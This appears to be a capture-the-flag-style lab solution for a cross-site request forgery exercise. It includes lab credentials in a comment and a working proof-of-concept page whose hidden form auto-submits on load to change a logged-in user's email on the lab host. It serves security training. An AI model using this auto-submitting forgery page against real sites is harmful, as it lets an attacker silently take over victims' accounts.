<!-- Lab #1 - CSRF vulnerability with no defenses

Vulnerable parameter - email change functionality

Goal - exploit the CSRF vulnerability and change the email address

creds - wiener:peter

Analysis:

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - satisfied -->

<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://0ab6005604ac183580ffad73006d00fa.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>

<!-- python -m SimpleHTTPServer 5555   
http://127.0.0.1:5555/Lab-01.html -->